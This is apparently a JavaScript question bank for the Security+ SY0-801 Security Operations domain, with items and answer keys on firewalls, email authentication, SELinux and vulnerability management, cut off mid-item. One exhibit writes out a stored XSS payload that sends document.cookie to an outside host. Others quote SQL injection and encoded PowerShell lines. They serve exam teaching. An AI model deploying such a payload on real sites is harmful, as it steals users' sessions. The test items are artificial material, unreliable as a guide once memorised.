// Domain 4 — Security Operations. Original questions, written to the SY0-801 objectives and checked against the
// sources listed in lessons.js (RFC 7208, 6376, 8301, 7489, 9989, 8601, 3748, 3580, 2865, 5424, 5425, 5426, 6587,
// 3411, 3414, 6353, 7011, 3954, 6749, 9700, 3227, 9116; BIMI Group guidance; NIST SP 800-126 Rev. 3, 800-61 Rev. 3,
// 800-86, 800-40 Rev. 4, 800-88 Rev. 2, 800-63A-4, 800-63B-4; OASIS SAML 2.0; OpenID Connect Core; OWASP; Microsoft
// Learn; Red Hat SELinux documentation; GDPR Article 33). Log lines, headers, configurations and tool output in
// exhibits are hand-written from documentation, not captured from real systems (see REVIEW-TODO.md).
const L41A = '4.1-hardening-deception-appcontrol';
const L41B = '4.1-network-endpoint-controls';
const L41C = '4.1-app-email-os-security';
const L42 = '4.2-asset-management';
const L43 = '4.3-vulnerability-management';
const L44A = '4.4-monitoring-activities-tools';
const L44B = '4.4-monitoring-protocols';
const L45A = '4.5-identity-federation-mfa';
const L45B = '4.5-access-models-passwords';
const L46 = '4.6-automation-orchestration';
const L47 = '4.7-incident-response';
const L48 = '4.8-investigation-data';

const bank = [
  // ---------- 4.1 ----------
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L41B,
    stem: "Refer to the exhibit. ids01 raised an alert for the attack, but the request still reached web01 and returned HTTP 200. What explains this?",
    exhibit: `sw-core (Cisco IOS):
monitor session 1 source interface Gi1/0/1 both
monitor session 1 destination interface Gi1/0/48
! Gi1/0/1 = uplink to web01 (10.10.50.20), Gi1/0/48 = ids01 sensor port (no IP)

ids01 alert log:
2026-11-20 14:02:11 ALERT sid:1000234 "SQL injection attempt - UNION SELECT"
  198.51.100.23:51522 -> 10.10.50.20:80  action=alert

web01 access log:
198.51.100.23 - - [20/Nov/2026:14:02:11 +0000] "GET /item?id=1%20UNION%20SELECT... HTTP/1.1" 200 5120`,
    options: ["The signature produced a false negative, so the sensor never inspected the request", "ids01 failed open, so the request passed uninspected", "ids01 receives a copy of the traffic from a SPAN session, so it is out of band and can alert but cannot drop the original packets", "SPAN copies traffic only after the switch has dropped it, so a TAP is needed for alerting"],
    answer: [2],
    explanation: "The `monitor session` commands make Gi1/0/48 a **SPAN destination**: ids01 sees a copy of the traffic, out of band, so it works as an **IDS**. It detected the attack (an alert is a true positive) but cannot stop the original packets, which the switch forwarded to web01 regardless. To block, the sensor must sit **inline** as an IPS (or the web app needs a WAF). It was not a false negative: the alert fired. Fail-open is a failure mode of an inline device; an out-of-band sensor has no effect on traffic. SPAN copies forwarded traffic; it does not depend on drops, and a TAP would also be out of band." },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L41B,
    stem: "Contoso installs an IPS inline between its internet router and fw01. The IPS must block attacks during normal operation, but the business states that a failure of the IPS appliance must never take the e-commerce site offline, and security accepts uninspected traffic while it is down. Which configuration meets these requirements?",
    options: ["Configure the IPS to fail closed", "Move the IPS to a SPAN port so it can never affect traffic", "Run the IPS permanently in alert-only mode", "Configure the IPS to fail open through a hardware bypass"],
    answer: [3],
    explanation: "**Fail-open** (for example a bypass NIC or bypass switch) passes traffic uninspected when the appliance fails, which keeps the site up as required, while the device still blocks attacks when healthy. Fail-closed would stop all traffic when the IPS fails, violating the availability requirement. A SPAN port or permanent alert-only mode would protect availability but lose prevention during normal operation, which the stem requires." },
  { topic: '4.1', type: 'match', difficulty: 2, lesson: L41A,
    stem: "Match each deception deployment with the technology it describes.",
    pairs: [
      ["A decoy server running a fake SSH service is placed in the DMZ to attract and record attackers", "Honeypot"],
      ["A separate segment of several decoy servers and workstations lets analysts watch how an intruder moves between hosts", "Honeynet"],
      ["A spreadsheet named Executive-Salaries-2026.xlsx on a file share alerts the SOC whenever it is opened", "Honeyfile"],
      ["A fake cloud access key is planted in a configuration file; any API call that uses it raises an alert", "Honeytoken"],
      ["A domain user named adm-backup2 that nobody uses alerts on any logon or ticket request", "Canary account"],
    ],
    explanation: "A **honeypot** is one decoy system; a **honeynet** is a network of them for observing behavior across hosts. A **honeyfile** is a decoy file. A **honeytoken** is decoy data or a credential (fake keys, records, URLs) whose use anywhere signals compromise. A **canary account** is a decoy account; strictly it is a special kind of honeytoken, which is why the account scenario maps to the more specific term. All are detective controls with very few false positives, because no legitimate user should touch them." },
  { topic: '4.1', type: 'fill', difficulty: 2, lesson: L41B,
    stem: "Refer to the exhibit. ws01 (10.10.20.15) opens an SSH connection to 203.0.113.40. Enter the ID of the rule that handles this connection.",
    exhibit: `fw01 policy (evaluated top-down, first match wins, implicit deny at the end)
ID  Source           Destination      Service    Action
10  10.10.20.0/24    10.10.30.0/24    TCP 1433   allow
20  10.10.20.15/32   any              TCP 22     deny
30  10.10.0.0/16     203.0.113.0/24   TCP 22     allow
40  10.10.20.0/24    any              TCP 443    allow
50  any              any              any        deny  log`,
    answer: ['20', 'rule 20', 'id 20'],
    explanation: "Rules are checked top-down and the **first match** decides. Rule 10 does not match (wrong destination and port). **Rule 20** matches exactly (source 10.10.20.15, any destination, TCP 22), so the connection is **denied** there. Rule 30 would allow it, but it is never reached for this host: rule 20 shadows it for ws01. Rule 50 is the explicit catch-all deny that logs everything else." },
  { topic: '4.1', type: 'match', difficulty: 2, lesson: L41B,
    stem: "Match each requirement with the firewall type or feature that meets it.",
    pairs: [
      ["A 15-user branch needs one appliance that provides firewall, IPS, antivirus, web filtering and VPN", "Unified threat management (UTM)"],
      ["Block SQL injection and cross-site scripting in requests to a public web application", "Web application firewall (WAF)"],
      ["A public login API receives thousands of requests per second from a handful of addresses", "Rate limiting requests"],
      ["Permit only TCP 443 from the internet to the DMZ web server's address", "Layer 4 rule"],
      ["Allow a collaboration application but block its file-transfer function, whatever port it uses", "Layer 7 (application-aware) rule"],
    ],
    explanation: "**UTM** bundles several security functions in one appliance, a common fit for small sites. A **WAF** inspects HTTP requests to one application for injection and XSS. **Rate limiting** caps requests per source, which blunts floods and brute force from a few addresses. Permitting a port to an address is a **Layer 4** rule-based decision. Identifying an application and one of its functions regardless of port requires **Layer 7** inspection (NGFW application control)." },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L41B,
    stem: "Contoso's sales staff use company laptops from hotels and home and rarely connect to the VPN. Web content filtering must apply wherever the laptops are, without depending on a connection back to headquarters. Which approach meets this requirement?",
    options: ["A centralized proxy server at headquarters that all web traffic must traverse", "Agent-based content filtering installed on each laptop", "Category filtering on the headquarters DNS resolver", "A web application firewall in front of Contoso's public websites"],
    answer: [1],
    explanation: "An **agent-based** filter enforces policy on the device itself, so it follows the laptop to any network. A proxy at headquarters (and a DNS resolver at headquarters) only filters traffic that reaches headquarters, which these laptops usually do not. A WAF protects Contoso's own web applications from inbound attacks; it does not filter users' outbound browsing." },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L41B,
    stem: "Refer to the exhibit. One vendor platform with its own sensors on email, endpoints and identity produced this correlated incident and response, without a separate SIEM or SOAR. What type of tool is it?",
    exhibit: `Incident 4471 (severity High) - correlated
08:02  Email:    message from billing@examp1e-invoices.example delivered to alice@example.com
                 attachment Invoice_8812.docm
08:09  Endpoint: ws01 WINWORD.EXE spawned powershell.exe -enc JABzAD0A...
08:09  Endpoint: ws01 outbound TLS to 203.0.113.66:443
08:31  Identity: alice@example.com sign-in from 198.51.100.200 (new country), MFA push approved
08:33  Response: ws01 isolated; alice's sessions revoked; message purged from 14 mailboxes`,
    options: ["Endpoint detection and response (EDR)", "Antivirus", "Unified threat management (UTM)", "Extended detection and response (XDR)"],
    answer: [3],
    explanation: "**XDR** extends detection and response beyond the endpoint: it correlates email, endpoint and identity telemetry into one incident and responds across those layers (isolate the host, revoke sessions, purge mail). **EDR** would show the endpoint events and isolate ws01 but does not natively see the mail flow or sign-ins. **Antivirus** detects known-bad files. A **UTM** is a network gateway appliance and does not hold endpoint process or identity telemetry." },
  { topic: '4.1', type: 'order', difficulty: 2, lesson: L41B,
    stem: "A corporate laptop is plugged into an 802.1X-enabled switch port. Put the steps of the authentication in order.",
    items: [
      "The laptop connects; the port is unauthorized and passes only EAPOL frames",
      "The switch (authenticator) sends an EAP-Request/Identity to the laptop",
      "The supplicant replies with an EAP-Response/Identity",
      "The switch encapsulates the response in a RADIUS Access-Request to the authentication server",
      "The supplicant and the server complete the EAP method (for example EAP-TLS), relayed in RADIUS Access-Challenge and Access-Request messages",
      "The server returns Access-Accept with VLAN assignment attributes",
      "The switch authorizes the port and places the laptop in the assigned VLAN",
    ],
    explanation: "802.1X starts with the port in the **unauthorized** state, passing only EAP over LAN. The **authenticator** asks for an identity, the **supplicant** answers, and the authenticator relays EAP to the **authentication server** inside RADIUS (UDP 1812). The EAP method runs end to end between supplicant and server through Access-Challenge/Access-Request exchanges, with the switch as a pass-through (RFC 3748). The server sends **Access-Accept** (or Access-Reject), optionally with `Tunnel-Type=VLAN`, `Tunnel-Medium-Type=802` and `Tunnel-Private-Group-ID` (RFC 3580); only then does the switch authorize the port." },
  { topic: '4.1', type: 'match', difficulty: 2, lesson: L41B,
    stem: "Match each scenario with the network access control mechanism it describes.",
    pairs: [
      ["Visitors on guest Wi-Fi must accept the acceptable use policy in a browser before reaching the internet", "Captive portal"],
      ["Corporate laptops present device certificates through RADIUS before a switch port grants any network access", "802.1X port-based authentication"],
      ["A persistent agent on managed laptops reports patch level, and a laptop two months behind is placed in a remediation VLAN", "Agent-based posture assessment"],
      ["Contractor laptops run a temporary, dissolvable checker from the portal that verifies antivirus status and leaves nothing installed", "Agentless posture assessment"],
    ],
    explanation: "A **captive portal** redirects a browser to a login or acceptance page, typical for guests. **802.1X** authenticates the device or user at the port through EAP and RADIUS before access. **Posture assessment** checks device health; with a **persistent agent** it can check deeply and continuously on managed devices, while **agentless** methods (a dissolvable agent, network scan or queries to MDM/EDR) suit unmanaged contractor or BYOD devices." },
  { topic: '4.1', type: 'fill', difficulty: 3, lesson: L41C,
    stem: "Refer to the exhibit. A message with envelope sender user@example.com arrives from 203.0.113.99, an address that none of these records authorize. Evaluating per RFC 7208, enter the SPF result the receiver returns.",
    exhibit: `example.com.                  TXT "v=spf1 ip4:198.51.100.0/24 a include:_spf.crm.example.net include:spf.mailvendor.example.org include:_spf.hr.example.net -all"
_spf.crm.example.net.         TXT "v=spf1 include:a.crm.example.net include:b.crm.example.net ~all"
spf.mailvendor.example.org.   TXT "v=spf1 include:spf1.mailvendor.example.org include:spf2.mailvendor.example.org include:spf3.mailvendor.example.org ~all"
_spf.hr.example.net.          TXT "v=spf1 a:relay.hr.example.net exists:%{i}.allow.hr.example.net ?all"

(a.crm, b.crm and spf1-spf3.mailvendor contain only ip4 mechanisms; the example.com A record does not match 203.0.113.99)`,
    answer: ['permerror', 'perm error', 'permerror (too many DNS lookups)'],
    explanation: "RFC 7208 section 4.6.4 limits the terms that cause DNS queries (`include`, `a`, `mx`, `ptr`, `exists`, `redirect`) to **10** per evaluation, counting nested records, and requires **permerror** when the limit is exceeded. Because nothing matches, evaluation walks every record: `a` (1), include crm (2) with its two includes (3, 4), include mailvendor (5) with three includes (6, 7, 8), include hr (9), then `a:relay.hr...` (10) and `exists:` (11). The eleventh query exceeds the limit, so the result is **permerror** before the final `-all` is reached. `ip4` and `all` do not count toward the limit." },
  { topic: '4.1', type: 'multi', difficulty: 3, lesson: L41C,
    stem: "Refer to the exhibit. Which two statements are true? (Choose two.)",
    exhibit: `Authentication-Results: mx.example.org;
    spf=pass smtp.mailfrom=bounce.mailvendor.example.net;
    dkim=pass header.d=mailvendor.example.net header.s=m1;
    dmarc=fail (p=reject) header.from=example.com
Return-Path: <bounce-7731@bounce.mailvendor.example.net>
From: "Example Corp Payroll" <payroll@example.com>
Subject: Update your direct deposit details`,
    options: ["DMARC failed because SPF and DKIM both failed", "SPF passed for the envelope sender domain, not for the domain shown in the From header", "Setting aspf=s in example.com's DMARC record would make this message pass", "The DKIM signature proves the message was sent by example.com", "DMARC failed because neither the SPF-authenticated domain nor the DKIM signing domain is aligned with example.com", "A receiver honoring example.com's policy should deliver the message to the inbox because SPF passed"],
    answer: [1, 4],
    explanation: "SPF checks the **RFC 5321.MailFrom** (envelope) domain, here `bounce.mailvendor.example.net`, so its pass says nothing about `example.com`. DKIM passed for `d=mailvendor.example.net`. DMARC requires SPF or DKIM to pass **and be aligned** with the RFC 5322.From domain `example.com`; neither domain shares example.com's organizational domain, so DMARC fails. SPF and DKIM did not fail. Strict alignment (`aspf=s`) is tighter than relaxed and cannot turn a mismatch into a pass. The DKIM signature proves only that mailvendor.example.net signed it. With `p=reject` the receiver should reject, not deliver." },
  { topic: '4.1', type: 'fill', difficulty: 2, lesson: L41C,
    stem: "Refer to the exhibit. Enter the policy (none, quarantine or reject) that example.com requests receivers apply to this message.",
    exhibit: `$ dig +short TXT _dmarc.example.com
"v=DMARC1; p=quarantine; sp=reject; adkim=r; aspf=r; rua=mailto:dmarc-reports@example.com"

$ dig +short TXT _dmarc.billing.example.com
(no answer)

Message: From: invoices@billing.example.com
Result:  spf=fail, dkim=none  ->  DMARC fail`,
    answer: ['reject', 'sp=reject'],
    explanation: "The From domain `billing.example.com` has no DMARC record, so the receiver uses the record of the **organizational domain** `example.com` (RFC 7489; RFC 9989, which obsoleted it in May 2026, finds the same record with its DNS tree walk and applies `sp` to existing subdomains). Because the message is from a **subdomain**, the `sp=` tag applies: **reject**. `p=quarantine` applies to `example.com` itself. `rua` only says where aggregate reports go." },
  { topic: '4.1', type: 'multi', difficulty: 2, lesson: L41C,
    stem: "Contoso's marketing team wants the company logo displayed beside Contoso's email in mailbox providers that support BIMI. Which two steps does the BIMI Group's implementation guidance require? (Choose two.)",
    options: ["Publish DMARC at p=none with pct=100 so receivers can monitor first", "Publish a DMARC policy of p=quarantine or p=reject for the organizational domain, with no subdomain policy of none", "Publish a DKIM key under the selector name bimi", "Publish a TXT record at default._bimi.example.com that points to the logo in SVG Tiny Portable/Secure format", "Replace the SPF record with a BIMI record, because BIMI also authorizes sending IPs", "Obtain a Verified Mark Certificate, because a BIMI record is invalid without the a= tag"],
    answer: [1, 3],
    explanation: "BIMI requires **DMARC at enforcement** (`p=quarantine` or `p=reject`; the BIMI Group says `p=none`, `sp=none` or `pct` below 100 are not accepted) and a **BIMI TXT record** at `default._bimi.<domain>` (`v=BIMI1; l=<SVG URL>`) pointing to an SVG Tiny P/S logo. The `a=` tag for a VMC or CMC is optional in the guide, though many providers require a certificate before showing the logo. There is no special DKIM selector for BIMI, and BIMI does not authorize senders or replace SPF." },
  { topic: '4.1', type: 'fill', difficulty: 2, lesson: L41C,
    stem: "Refer to the exhibit. Enter the fully qualified DNS name the verifier queries to retrieve the public key for this signature.",
    exhibit: `DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=example.com; s=mkt2026;
    h=from:to:subject:date:message-id;
    bh=2jUSOH9NhtVGCQWNr9BrIAPreKQjO6Sn7XIkfJVOzv8=;
    b=Kq3m...Zt0=`,
    answer: ['mkt2026._domainkey.example.com', 'mkt2026._domainkey.example.com.'],
    explanation: "RFC 6376 stores DKIM keys under `_domainkey`: the verifier combines the selector `s=mkt2026` and the signing domain `d=example.com` into **mkt2026._domainkey.example.com** and fetches the TXT record there. The selector lets one domain publish several keys (for example one per mail vendor or per rotation period)." },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L41C,
    stem: "Refer to the exhibit. Apache on srv01 returns 403 for web files that were moved to /srv/web; standard file permissions allow the apache user to read them. Which fix resolves the problem while keeping SELinux protection?",
    exhibit: `[root@srv01 ~]# getenforce
Enforcing
[root@srv01 ~]# ls -Z /srv/web/index.html
unconfined_u:object_r:var_t:s0 /srv/web/index.html
[root@srv01 ~]# ausearch -m AVC -ts recent | tail -1
type=AVC msg=audit(1795432100.123:812): avc:  denied  { read } for  pid=2211 comm="httpd" name="index.html" dev="dm-0" ino=40211 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:var_t:s0 tclass=file permissive=0`,
    options: ["Run setenforce 0 so httpd can read the files", "Label /srv/web as httpd_sys_content_t with semanage fcontext and apply the label with restorecon", "Run chmod -R 777 /srv/web", "Set SELINUX=disabled in /etc/selinux/config and reboot"],
    answer: [1],
    explanation: "The AVC denial shows the `httpd_t` process denied `read` on a file labeled `var_t`; the targeted policy lets httpd read `httpd_sys_content_t`. The fix is to correct the **label**: `semanage fcontext -a -t httpd_sys_content_t \"/srv/web(/.*)?\"` then `restorecon -Rv /srv/web`, which survives relabels. `setenforce 0` (permissive) and disabling SELinux remove the mandatory access control for the whole system. `chmod 777` changes discretionary permissions, which already allow access, and weakens security without touching the SELinux denial." },
  { topic: '4.1', type: 'single', difficulty: 3, lesson: L41C,
    stem: "Refer to the exhibit. Which inactivity limit applies to ws01, and why?",
    exhibit: `Group Policy Management - domain example.com
Domain example.com
  Linked GPO: Baseline-Security   (link Enforced: Yes)
     Interactive logon: Machine inactivity limit = 600 seconds
  OU=Engineering   (Block Inheritance: Yes)
     Linked GPO: Eng-Workstations
        Interactive logon: Machine inactivity limit = 1800 seconds
Computer ws01 is in OU=Engineering`,
    options: ["1800 seconds, because OU GPOs are processed last and Block Inheritance stops the domain GPO", "1800 seconds, because the local GPO always has the final say", "600 seconds, because an Enforced link cannot be blocked and wins over the conflicting OU setting", "Neither; conflicting GPOs cancel out and Windows uses its default"],
    answer: [2],
    explanation: "Normally GPOs apply local, site, domain, then OU, so the OU setting would win; and Block Inheritance on the OU would stop domain GPOs. But Microsoft documents that **Enforced is a link property that takes precedence over Block Inheritance**, and an enforced GPO's settings cannot be overridden by lower-level GPOs. So ws01 gets **600 seconds**. The local GPO is processed first, so it has the least precedence. Conflicts do not cancel out; one setting wins." },
  { topic: '4.1', type: 'single', difficulty: 2, lesson: L41C,
    stem: "Refer to the exhibit. A penetration tester stored the script shown in a comment field, and other users' session IDs were sent to the tester's server. Which cookie attribute would have stopped the script from reading the session ID?",
    exhibit: `Response from app.example.com:
HTTP/1.1 200 OK
Set-Cookie: SESSIONID=8f3a9c1e7b2d44a0; Path=/; Secure; SameSite=Lax

Stored comment:
<script>fetch('https://203.0.113.9/c?' + document.cookie)</script>`,
    options: ["HttpOnly", "Secure", "SameSite=Strict", "Domain=example.com"],
    answer: [0],
    explanation: "OWASP: **HttpOnly** tells the browser not to let scripts read the cookie through `document.cookie`, which is exactly what this stored XSS payload does. `Secure` is already set and only keeps the cookie off plain HTTP. `SameSite` controls whether the cookie is sent on cross-site requests (CSRF defense); it does not hide the cookie from scripts on the same site. `Domain` would widen, not restrict, where the cookie is sent. The real fix for the XSS is output encoding and input validation; HttpOnly limits the damage." },
  { topic: '4.1', type: 'match', difficulty: 2, lesson: L41C,
    stem: "Match each scenario with the application security control it describes.",
    pairs: [
      ["A build step flags SQL built by string concatenation in a source file before the code ever runs", "Static code analysis"],
      ["The server rejects a quantity field containing letters or a negative number, whatever the browser sent", "Input validation"],
      ["Browsers must never send the session ID over plain HTTP or expose it to page scripts", "Secure cookie attributes"],
      ["Endpoints install an update only after verifying the publisher's signature and that the file is unmodified", "Code signing"],
      ["A git push is rejected because a file contains a string matching a cloud access key format", "Secrets scanning"],
    ],
    explanation: "**SAST** analyzes code without running it. **Input validation** on the server checks syntax and semantics regardless of client-side checks. **Secure** and **HttpOnly** cookie attributes keep session IDs off HTTP and away from scripts. **Code signing** proves the publisher and integrity of software, not that it is safe. **Secrets scanning** with push protection stops credentials entering the repository; one that got in must be revoked." },
  { topic: '4.1', type: 'match', difficulty: 1, lesson: L41A,
    stem: "Match each scenario with the mitigation technique applied.",
    pairs: [
      ["An unpatchable building-control server is moved to its own zone reachable only from one engineering workstation", "Segmentation"],
      ["A new Linux server has unused services removed, default accounts disabled and the CIS Benchmark applied before going live", "Hardening"],
      ["Unknown email attachments are executed in an instrumented virtual machine before delivery", "Sandboxing"],
      ["A lost company phone is remotely wiped", "Mobile device management (MDM)"],
      ["Point-of-sale terminals may run only the approved checkout application and its updater", "Application allow list"],
    ],
    explanation: "Isolating a system that cannot be fixed is **segmentation**, the classic compensating control. Applying a baseline and removing unneeded services is **hardening**. Detonating unknown files in isolation is **sandboxing**. Remote wipe is an **MDM** function. Allowing only approved software, denying everything else by default, is an **application allow list**." },
  { topic: '4.1', type: 'single', difficulty: 1, lesson: L41B,
    stem: "A new ransomware variant crossed Contoso's signature-based NIPS without any alert, although the NIPS was healthy and inspecting the traffic. What is this outcome called, and which detection method could have caught it?",
    options: ["A false positive; signature-based detection with more signatures", "A true negative; heuristic file scanning", "A false negative; anomaly- or behavior-based detection", "A false positive; anomaly-based detection"],
    answer: [2],
    explanation: "A real attack with no alert is a **false negative**. Signature detection only recognizes known patterns, so a new variant has none to match. **Anomaly/behavior-based** detection compares activity with a baseline (or looks for malicious behavior such as mass encryption) and can flag the unknown, at the cost of more false positives. A false positive is an alert on benign activity; a true negative is correctly not alerting on benign activity." },

  // ---------- 4.2 ----------
  { topic: '4.2', type: 'order', difficulty: 1, lesson: L42,
    stem: "Put the stages of the asset management life cycle in order, as the SY0-801 objectives list them.",
    items: [
      "Planning/scoping: define the need, the data classification and the security requirements",
      "Acquisition/procurement: buy from an approved vendor with support and patch commitments in the contract",
      "Assignment/accounting: tag the asset, record it in the CMDB and assign an owner and user",
      "Monitoring/asset tracking: reconcile discovery scans and agent reports with the inventory",
      "Disposal/decommissioning: sanitize the media, keep the certificate and update the CMDB",
    ],
    explanation: "Requirements come first (planning/scoping), are built into purchasing (acquisition/procurement), the asset is recorded and given an owner and user (assignment/accounting), its presence and state are tracked throughout its life (monitoring/asset tracking), and it is finally retired with sanitization and documentation (disposal/decommissioning)." },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L42,
    stem: "Refer to the exhibit. Which life cycle activity produced this finding, and what should happen first?",
    exhibit: `Weekly asset reconciliation - 2026-11-21
Source                        Seen    In CMDB   Not in CMDB
NAC (802.1X and MAB)           412      409          3
EDR console                    388      388          0
DHCP leases (10.10.0.0/16)     431      409         22

Not in CMDB (first 3 of 22):
10.10.40.77   00:1a:2b:3c:4d:5e   hostname NAS-DS220   sw-floor3 Gi1/0/17
10.10.40.81   00:1a:2b:3c:4d:61   (no hostname)        sw-floor3 Gi1/0/22
10.10.12.140  00:1a:2b:3c:4d:90   hostname LAB-PI-03   sw-lab1  Gi1/0/5`,
    options: ["Monitoring/asset tracking; locate each unknown device and its owner, then register and secure it or remove it", "Disposal; sanitize the 22 devices before investigating", "Planning/scoping; rewrite the asset policy before looking at the devices", "Assignment/accounting; add all 22 devices to the CMDB as they are so the counts match"],
    answer: [0],
    explanation: "Reconciling what discovery sources see with the inventory is **monitoring/asset tracking**. Devices on the network but not in the CMDB (and not running EDR) are unknown assets: possibly shadow IT or rogue devices. First identify where and whose they are, then either bring them under management (record, assign, secure) or remove them. Sanitizing unknown devices skips the investigation, rewriting policy does not deal with the devices, and adding them unexamined hides the problem." },
  { topic: '4.2', type: 'multi', difficulty: 2, lesson: L42,
    stem: "Contoso must return 40 leased laptops, whose SSDs held confidential data, to the leasing company. Which two actions best meet the disposal requirements? (Choose two.)",
    options: ["Quick-format each SSD before shipping", "Purge each SSD with the drive's sanitize or cryptographic erase function, following NIST SP 800-88", "Overwrite each SSD once with zeros, which also clears its spare blocks", "Physically shred the SSDs before returning the laptops", "Record a certificate of sanitization listing each serial number and update the asset inventory", "Delete the user profiles and empty the recycle bin"],
    answer: [1, 4],
    explanation: "SP 800-88 Rev. 2 defines clear, purge and destroy. For confidential data on SSDs leaving the organization, **purge** (built-in sanitize or cryptographic erase) makes recovery infeasible while leaving the device usable, which a lease return requires. **Documenting** each sanitization (SP 800-88 includes a sample certificate of sanitization) and updating the inventory closes the asset's record. Formatting and deleting profiles leave data recoverable. A single overwrite is unreliable on SSDs because of wear leveling and spare blocks. Shredding destroys equipment that belongs to the lessor." },
  { topic: '4.2', type: 'single', difficulty: 2, lesson: L42,
    stem: "Contoso is choosing a network camera model for 200 sites with a planned seven-year service life. Which acquisition requirement most directly reduces the risk that the cameras become unpatched, unsupported devices?",
    options: ["The lowest unit price among three quotes", "Support for Power over Ethernet", "A contractual commitment to security updates through a stated end-of-support date beyond seven years, and a published vulnerability disclosure process", "Purchasing through any online marketplace for faster delivery"],
    answer: [2],
    explanation: "Putting **support and patch commitments** (with an end-of-support date that covers the service life) and a disclosure process into the contract addresses the risk at procurement, as SP 800-40 Rev. 4 recommends when it says to consider software maintenance in procurement. Price and PoE are functional or financial criteria. Unvetted marketplaces raise counterfeit and tampering risk." },
  { topic: '4.2', type: 'single', difficulty: 1, lesson: L42,
    stem: "A laptop is stolen from a car. IT cannot tell whose laptop it was, whether it was encrypted or whether it held customer data. Which asset management stage was neglected?",
    options: ["Disposal/decommissioning", "Assignment/accounting", "Planning/scoping", "Acquisition/procurement"],
    answer: [1],
    explanation: "**Assignment/accounting** records each asset in the inventory with its owner, assigned user, configuration and the classification of data it holds. Without that record, a loss cannot be assessed or reported correctly. Disposal applies at end of life; planning and procurement happen before the asset exists in the environment." },

  // ---------- 4.3 ----------
  { topic: '4.3', type: 'order', difficulty: 1, lesson: L43,
    stem: "Put these vulnerability management tasks in order.",
    items: [
      "Run credentialed scans of the server subnets listed in IPAM",
      "Rank the findings by severity, exploitation evidence and asset exposure",
      "Patch or apply compensating controls through change management",
      "Rescan the affected hosts to confirm the findings are closed",
      "Report remediation metrics to management",
    ],
    explanation: "The cycle is **identification** (scan the scope IPAM defines), **prioritization** (severity plus context), **remediation** (patch, mitigate or otherwise treat the risk through change control), **verification** (rescan or retest) and **reporting**. Reporting after verification ensures the metrics reflect fixes that actually worked." },
  { topic: '4.3', type: 'single', difficulty: 2, lesson: L43,
    stem: "Refer to the exhibit. What should the vulnerability analyst do?",
    exhibit: `Ticket VM-2291   Status: Closed (patched 2026-11-14 by server ops)
Finding: Example HTTP Server remote code execution (plugin EX-91822)
Host: srv01 (10.10.30.21)

Rescan 2026-11-18, credentialed:
Host    Plugin     Severity  Evidence
srv01   EX-91822   Critical  Installed package: exhttpd 2.4.58-1
                             Fixed version:     exhttpd 2.4.62-1`,
    options: ["Mark the finding a false positive, because the ticket says the host was patched", "Accept the risk, because the ticket is already closed", "Lower the severity to Medium, because srv01 is internal", "Reopen the ticket, because verification shows the fixed version is not installed, and track it to remediation with the owner"],
    answer: [3],
    explanation: "**Verification** exists for exactly this case: the credentialed rescan reads the installed package version and shows it is still below the fixed version, so the remediation did not happen (or was applied elsewhere). Reopen and track it. Calling it a false positive ignores direct evidence. Closing a ticket is not a risk acceptance, which needs a documented decision by the risk owner. Severity should not be lowered to make a finding go away; internal exposure is considered in prioritization, not used to erase a critical RCE." },
  { topic: '4.3', type: 'match', difficulty: 2, lesson: L43,
    stem: "Match each task with the vulnerability management method that fits it.",
    pairs: [
      ["List every live subnet and the team that owns each address range before scheduling scans", "IPAM"],
      ["Detect a storage bucket made public and a security group allowing RDP from 0.0.0.0/0", "Cloud security posture management (CSPM)"],
      ["Find an authorization flaw in Contoso's own payroll code that has no CVE ID", "Source code review"],
      ["Find missing patches on 300 Windows servers by logging in with a scan account", "Credentialed vulnerability scan"],
      ["Learn which low-severity findings an external tester chained into domain admin access", "Penetration test report review"],
    ],
    explanation: "**IPAM** supplies scan scope and address ownership. **CSPM** checks cloud configurations through provider APIs. **Source code review** finds flaws in in-house code that no CVE describes. A **credentialed scan** reads installed versions directly, so it finds missing patches accurately. A **penetration test report** shows real attack chains, which drives prioritization." },
  { topic: '4.3', type: 'single', difficulty: 3, lesson: L43,
    stem: "Refer to the exhibit. The server team says their Linux distribution backports security fixes into its OpenSSH package without changing the upstream version number. What is the best next step?",
    exhibit: `External scan (unauthenticated) - 198.51.100.25
Port 22/tcp  banner: SSH-2.0-OpenSSH_8.9p1
Finding: "OpenSSH older than current upstream release - multiple vulnerabilities"
Detection method: version check (banner)`,
    options: ["Confirm with a credentialed scan or the installed package's changelog whether the fixes are present before remediating or recording a false positive", "Replace the distribution's OpenSSH with the latest upstream version compiled from source today", "Record a false positive because the server team said so", "Block TCP 22 at the perimeter for all sources permanently"],
    answer: [0],
    explanation: "A **non-credentialed** scan infers vulnerability from the banner, so backported fixes cause **false positives**. Verify with evidence: a credentialed scan or the package changelog. Compiling from source abandons the vendor's patch stream and is a change made without knowing there is a problem. Accepting a claim without evidence is not verification. Blocking SSH permanently may break required access and does not answer whether the host is vulnerable." },
  { topic: '4.3', type: 'multi', difficulty: 2, lesson: L43,
    stem: "A critical vulnerability in Contoso's internet-facing file transfer appliance is being actively exploited. The vendor has published a workaround but no patch. Following SP 800-40 Rev. 4's emergency mitigation scenario, which two actions are appropriate now? (Choose two.)",
    options: ["Wait for the next monthly patch window", "Apply the vendor's workaround, such as disabling the vulnerable feature", "Formally accept the risk until the patch is released", "Restrict access to the appliance to known partner addresses at the firewall and increase monitoring of it", "Lower the CVSS score because no patch exists"],
    answer: [1, 3],
    explanation: "When no patch exists, SP 800-40 Rev. 4 calls for **emergency mitigation**: reduce risk with the **workaround** and additional controls such as **restricting exposure** and monitoring (both are the *mitigate* response). Waiting for a routine window and accepting the risk are inappropriate for an actively exploited, internet-facing flaw. A missing patch does not change the vulnerability's severity." },
  { topic: '4.3', type: 'single', difficulty: 2, lesson: L43,
    stem: "A security researcher found a flaw in Contoso's customer portal and wants to know whether testing is authorized, how to report safely and how quickly Contoso will respond. Contoso does not pay for findings. What should Contoso publish?",
    options: ["A bug bounty program with a payout table", "A non-disclosure agreement that researchers must sign before reporting", "A statement of work for an external penetration test", "A responsible disclosure policy with scope, safe harbor and response times, and a security.txt file naming the contact"],
    answer: [3],
